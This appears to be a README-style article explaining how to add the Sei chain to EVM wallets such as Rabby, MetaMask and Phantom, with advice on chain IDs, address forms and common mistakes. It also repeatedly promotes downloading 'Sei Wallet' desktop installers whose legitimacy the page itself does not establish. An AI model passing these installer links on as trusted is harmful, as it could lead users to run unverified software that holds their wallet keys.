![Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/raw/main/assets/banner-article.png)

<h1 align="center">Sei in Rabby, Phantom and other EVM wallets, or in Sei Wallet</h1>

<p align="center">What Rabby and Phantom show for SEI, and where the difference matters.</p>

<p align="center">
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe"><img src="https://img.shields.io/badge/download-windows-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Download Sei Wallet for Windows" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg"><img src="https://img.shields.io/badge/download-macos-a82731?style=for-the-badge&labelColor=201412&logo=apple&logoColor=white" alt="Download Sei Wallet for macOS" height="40"></a>
  <a href="https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip"><img src="https://img.shields.io/badge/download-linux-a82731?style=for-the-badge&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Download Sei Wallet for Linux" height="40"></a>
</p>

<div align="center">

| Platform | Requirements | File |
|:--|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | Windows 10 (1909) or later, 64-bit | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | macOS 12 or later | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | x64, Ubuntu 20.04 or later, or equivalent | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

All versions and checksums are on the [Sei Wallet v6.6.2 release page](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2).

> [!WARNING]
> Only download from this GitHub release page. Sei Wallet support never asks for a recovery phrase, and anyone who does is running a scam.

Sei is an EVM chain, so any wallet that lets you add a custom network can hold it. That includes Rabby, MetaMask, Trust Wallet and, in some versions, Phantom. The question is not whether they can hold SEI but what each one does once it has it.

The short version: a general EVM wallet gives you one interface for many chains and nothing Sei-specific. A Sei-native app gives you staking, unbonding and the two-form address model, and nothing else. Pick by what you actually do.

## The setup is the same everywhere

Four fields and a name:

- **Network name** - Sei.
- **RPC endpoint** - the one named in Sei's documentation.
- **Chain ID** - 1329 for mainnet.
- **Symbol** - SEI.

Some wallets also ask for an explorer URL, which is cosmetic. The two fields that matter are the RPC and the chain ID: if they do not describe the same network, everything after that fails.

Rabby and MetaMask both take a custom network this way. Trust Wallet does too, and [the Trust Wallet route](https://github.com/sei-chain/sei-wallet-setup/blob/main/configure-the-network-in-trust.md) covers that one specifically.

## Phantom is the outlier

Phantom began as a Solana wallet and has extended into EVM support in some versions. That means two things worth checking before you commit:

1. **Whether your version supports custom EVM networks at all.**
2. **Whether it treats the added Sei network as a first-class chain** or as a secondary view.

I did not verify Phantom's current Sei support here, and I am not going to assert it. Add the network and look: if the balance appears, the RPC is right; if it does not, either the network is wrong or that build does not support it.

## The address you get

All of these derive the same `0x...` address from the same phrase, because the derivation is Ethereum's. That is convenient and slightly dangerous: the address looks identical everywhere, so an address copied from another chain is a valid Sei address too - for a different account, if it was never yours on Sei.

Sei's dual address system adds a wrinkle no other EVM chain has: one key produces a `0x...` and a `sei1...` address, linked on-chain by an association. A general wallet shows only the first, so a balance sitting under the second is invisible. That is not a loss, and [the address-form rules](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md) explain how to resolve it.

If you are unsure which account you are looking at, [the address lookup](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md) is the shorter path than guessing.

## What none of them do

- **No staking interface.** Delegation exists on Sei, but a general wallet does not expose validators, rewards or unbonding.
- **No unbonding visibility.** A position staked elsewhere will not appear with a countdown.
- **No handling of the two-address model.** You get the EVM view and nothing else.
- **No Sei-specific support.** The wallet will treat Sei like any EVM chain, which is fine until an address-form or memo question appears.

If staking is the point, the general-wallet route is the wrong tool, and [the Sei-native option](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md) is the one built for it.

## The failure modes, which are shared

- **Wrong network selected.** The balance shows zero and the address looks right. This is the most common "my funds are gone" report.
- **A copy-pasted address from another chain.** Identical format, different account.
- **An approval signed without reading.** Tokens can be drained through approvals rather than transfers, and every EVM wallet is exposed to it.
- **A malicious network entry.** An RPC added from a message can show false balances and false confirmations. It cannot sign, but it can mislead. Take endpoints from documentation.

None of these is a reason to avoid EVM wallets. They are the reasons to read the confirmation screen and to verify the network before sending.

## Choosing

**Rabby or MetaMask** for multi-chain activity and web applications. Rabby leans toward pre-signing checks, MetaMask toward ubiquity; [the MetaMask walkthrough](https://github.com/sei-chain/sei-wallet-setup/blob/main/add-the-network-to-metamask.md) covers the setup, and the two are the same category.

**Phantom** only if you already use it for Solana and its EVM support covers Sei in your version.

**Sei Wallet** for holding and staking SEI, with the address model handled explicitly.

**Both**, ideally with separate phrases: one for the balance you stake, one for the small balance you use with applications. The same phrase in two applications doubles the number of places it can leak from.

## After the network is added

1. Confirm the balance appears under Sei, not under another chain.
2. Send a small test amount before a large one.
3. Check the transaction on an explorer rather than trusting the wallet's optimistic status.
4. Add tokens manually if they do not appear - token visibility is a wallet-side list, not a chain property.

If a transfer has not landed after those steps, [the Sei Wallet pending transaction guide](https://github.com/sei-chain/sei-wallet-staking/blob/main/transaction-stuck-as-pending.md) covers the waiting cases and the genuinely lost ones separately.

## Frequently asked questions

**Can I put SEI in Rabby?** Yes, by adding Sei as a custom EVM network with chain ID 1329.

**Does Phantom support Sei?** Unverified here. Some Phantom versions support EVM networks; check yours rather than assuming.

**Will my address be the same in every wallet?** The `0x...` address should be, if each uses the Ethereum derivation. The `sei1...` form is Sei-specific and only interfaces that understand the association show it.

**Can I stake from these wallets?** No. They hold and send; staking needs an interface built for Sei.

**Why does the balance read zero after adding Sei?** The network is wrong, or the account is not the one you think. Check both before anything else.

**Is one of them safer?** Not by construction. All of them sign with keys on your device, and all depend on you verifying the network and the approval.

**Do I need to add the token separately?** For native SEI, no - it is the network's own asset. For USDC and other tokens, the wallet needs the contract added to display a balance.

## Download Sei Wallet

<div align="center">

| Platform | Installer |
|:--|:--|
| <img src="https://img.shields.io/badge/Windows-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTMgNS41IDEwLjUgNC41djdIM3pNMTEuNSA0LjMgMjEgM3Y4LjVoLTkuNXpNMyAxMi41aDcuNXY3TDMgMTguNXpNMTEuNSAxMi41SDIxVjIxbC05LjUtMS4zeicvPjwvc3ZnPg%3D%3D&logoColor=white" alt="Windows" height="24"> | [`sei-wallet-v6.6.2.exe`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.exe) |
| <img src="https://img.shields.io/badge/macOS-a82731?style=flat-square&labelColor=201412&logo=apple&logoColor=white" alt="macOS" height="24"> | [`sei-wallet-v6.6.2.dmg`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.dmg) |
| <img src="https://img.shields.io/badge/Linux-a82731?style=flat-square&labelColor=201412&logo=data%3Aimage%2Fsvg%2Bxml%3Bbase64%2CPHN2ZyB4bWxucz0naHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmcnIHZpZXdCb3g9JzAgMCAyNCAyNCc%2BPHBhdGggZmlsbD0nI2ZmZmZmZicgZD0nTTQgNS43IDUuNiA0LjIgMTMgMTJsLTcuNCA3LjhMNCAxOC4zIDkuOCAxMnonLz48cGF0aCBmaWxsPScjZmZmZmZmJyBkPSdNMTIgMTYuNGg4djIuMWgtOHonLz48L3N2Zz4%3D&logoColor=white" alt="Linux" height="24"> | [`sei-wallet-v6.6.2.zip`](https://github.com/sei-chain/sei-wallet/releases/download/v6.6.2/sei-wallet-v6.6.2.zip) |

</div>

Every file above is attached to the [Sei Wallet v6.6.2 release](https://github.com/sei-chain/sei-wallet/releases/tag/v6.6.2), where the SHA-256 values are published. Verify the download before you run it.

## Related articles

- [Adding Sei to Trust Wallet, or holding it in Sei Wallet](https://github.com/sei-chain/sei-wallet-setup/blob/main/configure-the-network-in-trust.md)
- [sei1 and 0x addresses in Sei Wallet: which one to use](https://github.com/sei-chain/sei-wallet-setup/blob/main/which-address-form-to-use.md)
- [Where to find your Sei Wallet address](https://github.com/sei-chain/sei-wallet-setup/blob/main/where-to-find-your-address.md)
- [What Sei Wallet is and how a desktop Sei wallet works](https://github.com/sei-chain/sei-wallet-setup/blob/main/what-the-desktop-app-is-and-how-it-works.md)
